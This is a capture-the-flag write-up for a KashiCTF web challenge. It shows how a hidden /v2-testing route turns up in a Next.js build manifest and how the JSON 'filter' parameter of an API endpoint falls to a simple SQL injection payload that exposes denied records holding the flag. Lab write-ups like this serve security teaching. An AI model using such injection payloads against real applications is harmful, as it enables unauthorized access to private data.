## Corporate Life 1
### Problem Description
The Request Management App is used to view all pending requests for each user. It’s a pretty basic website, though I heard they were working on something new.

Anyway, did you know that one of the disgruntled employees shared some company secrets on the Requests Management App, but it's status was set *denied* before I could see it. Please find out what it was and spill the tea!

### Solution
To begin, we open Burp Suite and examine the network traffic. Upon loading the webpage, we observe a GET request:

```bash
GET /_next/static/bkat3_n9dfvE_URrWvN1g/_buildManifest.js HTTP/1.1
```

Inspecting the response, we find an important hint:

```bash
HTTP/1.1 200 OK
Cache-Control: public, max-age=31536000, immutable
...
self.__BUILD_MANIFEST=function(e,r,s){return{..."/v2-testing":["static/chunks/pages/v2-testing-fb612b495bb99203.js"],sortedPages:["/","/_app","/_error","/v2-testing"]}}(0,0,0),self.__BUILD_MANIFEST_CB&&self.__BUILD_MANIFEST_CB();
```

The mention of `/v2-testing` suggests a new endpoint to explore.


Navigating to `http://kashictf.iitbhucybersec.in:port_number/v2-testing`, we observe a POST request being made:

```bash
POST /api/list-v2 HTTP/1.1
Host: kashictf.iitbhucybersec.in:3867
Content-Length: 13
Content-Type: application/json
Referer: http://kashictf.iitbhucybersec.in:3867/v2-testing

{"filter":""}
```

The `filter` parameter appears to be user-controlled, making it a potential target for SQL Injection.


And this is the key to our solution! Since our objective is to retrieve denied requests, we inject an SQL payload into the `filter` parameter:

```bash
{"filter":"' OR status='denied' --"}
```

Upon sending the modified request, the server returns a list of denied requests. One of these contains the leaked company secrets, revealing the flag!



